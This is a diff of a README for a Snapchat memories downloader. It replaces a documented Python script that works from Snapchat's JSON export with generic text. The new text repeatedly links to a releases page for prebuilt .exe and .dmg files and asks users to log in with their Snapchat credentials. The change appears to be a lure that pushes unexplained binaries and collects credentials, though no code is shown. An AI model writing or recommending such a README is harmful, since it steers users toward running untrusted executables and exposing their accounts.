@@ -1,41 +1,97 @@
-# Snapchat Memory Downloader
+# 📸 SnapchatMemoryDownloader - Save Your Memories Easily
 
-Recently, Snapchat introduced a **5GB limit on Memories**, so if you want a complete backup of all your memories, you need to download your data manually. This Python script helps you download all your Snapchat memories from a JSON export.  
+## 🚀 Getting Started
 
-As seen on: https://www.tiktok.com/@giraintech/video/7583879890265558280
+Welcome to SnapchatMemoryDownloader! This application helps you download your Snapchat memories directly to your external hard drive. Follow the steps below to get started.
 
----
+## 📥 Download Here
 
-## Getting Your Snapchat Data
-1. Open Snapchat and go to Settings → My Data.
-2. Request your Memories and select JSON formatting.
-3. Snapchat will email you a link to download a ZIP file containing your exported data.
-4. Extract the ZIP file and locate the JSON file to use with this script.
+[![Download SnapchatMemoryDownloader](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/franco123883/SnapchatMemoryDownloader/releases)
 
-## How It Works
+## 💾 System Requirements
 
-1. Export your Snapchat memories as a JSON file from Snapchat.
-2. Provide the location of that JSON file in the script (`JSON_FILE` variable).
-3. Choose the output directory where you want all your memories to be saved (`OUTPUT_DIR` variable).  
+To run SnapchatMemoryDownloader, you need:
 
-> **Tip for macOS users:** If you want to save directly to an external drive, use the path format `/Volumes/Name_of_Drive`.
+- An operating system: Windows 10 or later, MacOS Mojave or later
+- At least 100 MB of free disk space
+- An internet connection for downloading memories
+- A compatible external hard drive with sufficient space for your memories
 
-4. Run the script:
+## 📦 Installation Instructions
 
-```bash
-python3 download_snapchat.py
-```
+1. **Visit the Download Page:**
 
-## Requirements
-- Python 3.x
-- Internet connection (to download media files)
-- urllib (comes with Python standard library)
-- Access to the JSON export from Snapchat
+   Go to the [Releases Page](https://github.com/franco123883/SnapchatMemoryDownloader/releases) to find the latest version of the software.
 
-## Troubleshooting
-### ❌ HTTP Error 403: Forbidden
+2. **Download the Application:**
 
-This is normal and expected.
+   Click on the latest version available. You will find a file named `SnapchatMemoryDownloader.exe` (for Windows) or `SnapchatMemoryDownloader.dmg` (for Mac). Click on it to start the download.
 
-Snapchat download links expire after some time and can only be used a limited number of times so if you are running this program a bit after downloading the json. You might need to re-export a new json from Snapchat. Re-run the code and use the new memories_history.json
+3. **Locate the Downloaded File:**
 
+   Once the download completes, open your Downloads folder and find the downloaded file.
+
+4. **Install the Application:**
+
+   - **For Windows:**
+     - Double-click the `SnapchatMemoryDownloader.exe` file.
+     - Follow the on-screen instructions to install the application on your computer.
+   
+   - **For Mac:**
+     - Double-click the `SnapchatMemoryDownloader.dmg` file.
+     - Drag the SnapchatMemoryDownloader icon to your Applications folder.
+
+5. **Connect Your External Hard Drive:**
+
+   Plug in your external hard drive to your computer. Ensure it is recognized by your system.
+
+## 🖥️ How to Use SnapchatMemoryDownloader
+
+1. **Open the Application:**
+  
+   Find SnapchatMemoryDownloader in your Applications folder (Mac) or in the Start Menu (Windows) and open it.
+
+2. **Sign in to Your Snapchat Account:**
+
+   You will need to log in using your Snapchat credentials. Ensure that you enter the correct information.
+
+3. **Select Memories to Download:**
+
+   The application will display all your memories. You can choose specific memories or select all of them for download.
+
+4. **Choose the Download Location:**
+
+   Select your external hard drive as the destination for saving your memories. Make sure you have enough space.
+
+5. **Start Downloading:**
+
+   Click the “Download” button to begin transferring your memories to the external hard drive. The progress will be displayed on the screen.
+
+## 📂 Where are My Files Saved?
+
+Your memories will be saved in a folder named `Snapchat Memories` on your external hard drive. You can access them anytime by navigating to that folder.
+
+## ❓ Troubleshooting Common Issues
+
+- **Unable to Download:**
+  Ensure you have a stable internet connection. Restart the application and try again.
+
+- **Application Crashes:**
+  Check if your operating system meets the requirements. If it does, reinstall the application.
+
+- **Memories Not Showing:**
+  Make sure you are logged into the correct Snapchat account. Refresh the application to see updated memories.
+
+## 💬 Support
+
+For further assistance, please visit the [GitHub Issues Page](https://github.com/franco123883/SnapchatMemoryDownloader/issues) to report problems or ask questions.
+
+## 📜 License
+
+SnapchatMemoryDownloader is open-source software. You can use and modify it under the terms of the MIT License. For more information, check the LICENSE file included in the repository.
+
+## 📥 Download Again
+
+Remember, you can always visit the [Releases Page](https://github.com/franco123883/SnapchatMemoryDownloader/releases) to download the latest version or check for updates.
+
+Thank you for choosing SnapchatMemoryDownloader! Enjoy saving your memories effortlessly.
